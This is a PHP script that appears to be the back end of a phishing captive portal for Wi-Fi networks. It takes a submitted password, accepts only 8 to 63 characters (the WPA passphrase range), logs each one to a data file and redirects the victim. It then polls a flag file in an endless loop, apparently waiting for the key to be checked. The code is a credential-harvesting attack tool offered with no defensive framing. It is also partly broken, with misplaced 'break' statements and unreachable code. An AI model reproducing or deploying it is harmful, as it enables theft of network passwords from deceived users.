<?php
error_reporting(0);

$count_my_page = ("../hit.txt");
$hits = file($count_my_page);
$hits[0] ++;
$fp = fopen($count_my_page , "w");
fputs($fp , "$hits[0]");
fclose($fp);

// Receive form Post data and Saving it in variables

$key1 = @$_POST['key1'];

// Write the name of text file where data will be store
$filename = "../data.txt";
$filename2 = "../status.txt";
$intento = "../intento";


// Marge all the variables with text in a single variable. 
$f_data= ''.$key1.'';


//if ( (strlen($key1) < 8) ) {
//	header("location:error.html");
//	break;

//}

//if ( (strlen($key1) > 63) ) {
//echo "<script type=\"text/javascript\">alert(\"The password must be less than 64 characters\");window.history.back()</script>";
//break;
//}

if (strlen($key1) < 64  AND strlen($key1) > 7) {
	header("location:final.html");
	$file = fopen($filename, "a");
	fwrite($file,"$f_data");
	fwrite($file,"\n");
	fclose($file);
        break;
	}else{header("location:error.html");
	    break;
}

$file = fopen($filename, "w");
fwrite($file,"$f_data");
fwrite($file,"\n");
fclose($file);


$archivo = fopen($intento, "w");
fwrite($archivo,"\n");
fclose($archivo);

while(1) 
{

if (file_get_contents("$intento") == 2) {
	    header("location:final.html");
	    break;
	} 
if (file_get_contents("$intento") == 1) {
	    header("location:error.html");
	    unlink($intento);
	    break;
	}
	
;
}

?>
